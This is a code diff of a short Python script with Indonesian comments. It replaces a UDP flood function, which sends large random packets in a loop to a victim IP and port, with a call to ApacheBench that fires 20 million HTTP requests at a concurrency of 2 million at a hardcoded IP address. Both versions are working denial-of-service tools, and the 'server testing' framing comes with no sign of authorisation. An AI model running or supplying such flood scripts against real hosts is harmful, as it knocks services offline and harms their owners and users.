@@ -1,22 +1,9 @@
-import sys
-import socket
-import time
-import random
+import subprocess
 
-def flood(victim, vport, duration):
-    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes = random._urandom(200000)
-    timeout =  time.time() + duration
-    sent = 0
+target_ip = "38.154.242.34"  # IP server yang ingin diuji
+target_port = 80  # Port yang sesuai
+requests_per_second = 2000000  # Jumlah permintaan per detik
+duration = 10  # Durasi pengujian dalam detik
 
-    while time.time() < timeout:
-        client.sendto(bytes, (victim, vport))
-        sent += 1
-
-    print("Selesai mengirim %s paket ke %s pada port %s" % (sent, victim, vport))
-    client.close()
-
-victim = sys.argv[1]
-vport = int(sys.argv[2])
-duration = int(sys.argv[3]) / 2  # durasi waktu untuk mengirim request 2gbps   
-flood(victim, vport, duration)
+command = f"ab -n {requests_per_second * duration} -c {requests_per_second} -g results.tsv http://{target_ip}:{target_port}/"
+subprocess.run(command, shell=True)
